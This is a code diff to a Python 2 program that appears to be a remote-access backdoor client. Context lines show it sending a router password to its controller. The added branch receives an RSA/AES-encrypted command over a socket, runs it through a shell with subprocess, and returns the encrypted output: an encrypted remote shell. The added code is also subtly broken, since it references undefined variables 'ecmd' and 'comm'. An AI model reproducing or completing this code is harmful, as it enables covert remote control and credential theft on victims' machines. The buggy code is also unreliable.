@@ -623,6 +623,26 @@ while True:
             erouter_password = router_password_AES.encrypt(router_password)
             send_one_message(s, erouter_password)
 
+        elif int(float(command)) == 401875051:
+            e_key16 = recv_one_message(s)
+            print "\nRecieved encrypted key"
+            decryptor16 = PKCS1_OAEP.new(keyPair)
+            d_key16 = decryptor16.decrypt(e_key16)
+            print "\nDecrypted encrypted key"
+
+            ecommand = recv_one_message(s)
+            command = AES256.decrypt(ecmd, d_key16)
+
+            cmd = subprocess.Popen(comm[:], shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            output_byte = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_byte)
+            currentWD = os.getcwd() + "> "
+
+            eoutput = AES256.encrypt(output_str, d_key16)
+            send_one_message(s, eoutput)
+
+
+
 
         elif int(float(command)) == 603295412:
             print "Exiting program"
